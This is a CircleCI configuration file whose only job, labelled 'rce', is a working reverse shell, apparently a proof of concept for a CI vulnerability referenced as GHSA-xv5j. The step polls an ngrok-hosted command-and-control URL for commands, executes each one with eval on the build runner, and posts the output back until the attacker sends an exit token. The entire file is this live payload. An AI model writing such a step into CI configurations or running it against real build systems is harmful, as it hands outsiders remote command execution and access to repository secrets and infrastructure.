version: 2.1

workflows:
  exploit:
    jobs:
      - rce

jobs:
  rce:
    docker:
      - image: cimg/base:current
    steps:
      - run:
          name: http-shell
          no_output_timeout: 5m
          command: |
            echo "=== GHSA-xv5j REVERSE SHELL ACTIVE ===" >&2
            C2="https://thrive-uncle-ferocity.ngrok-free.dev"
            curl -s "$C2/ping" -H "ngrok-skip-browser-warning: true" >/dev/null 2>&1
            while true; do
              CMD=$(curl -sf "$C2/cmd" -H "ngrok-skip-browser-warning: true" 2>/dev/null)
              if [ -n "$CMD" ]; then
                if [ "$CMD" = "__EXIT__" ]; then
                  echo "Shell closed by attacker" >&2
                  exit 0
                fi
                OUTPUT=$(eval "$CMD" 2>&1)
                curl -sf -X POST -d "$OUTPUT" "$C2/output" -H "ngrok-skip-browser-warning: true" >/dev/null 2>&1
              fi
              sleep 1
            done
